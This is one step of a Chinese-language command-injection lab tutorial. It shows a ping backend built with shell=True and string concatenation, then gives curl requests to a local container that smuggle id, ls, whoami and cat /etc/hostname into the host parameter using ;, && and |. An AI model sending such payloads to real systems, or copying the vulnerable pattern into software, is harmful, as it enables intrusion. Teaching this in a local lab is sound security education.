# TITLE: 注入 — 尝试命令分隔符
# STEP: 3
# MINUTES: 12

### WHY

现在我们来测试命令注入。

**原理**：后端代码使用 `shell=True` 和字符串拼接：
```python
cmd = f"ping -c 1 {target}"
```

这允许我们在 `target` 参数中注入额外的命令。

⚠️ **重要**：本实验仅限本地容器！命令注入可以执行任意系统命令，极其危险。

### DO

1. 正常 Ping 后执行额外命令：
```
curl "http://127.0.0.1:8087/?host=127.0.0.1;id"
```

2. 查看文件系统：
```
curl "http://127.0.0.1:8087/?host=127.0.0.1;ls%20-la"
```
（`%20` 是空格）

3. 使用其他分隔符：
```
curl "http://127.0.0.1:8087/?host=127.0.0.1&&whoami"
curl "http://127.0.0.1:8087/?host=127.0.0.1|cat%20/etc/hostname"
```

### CHECK

- `id` 命令输出了什么？（容器内的用户信息）
- 你能用命令注入读文件吗？
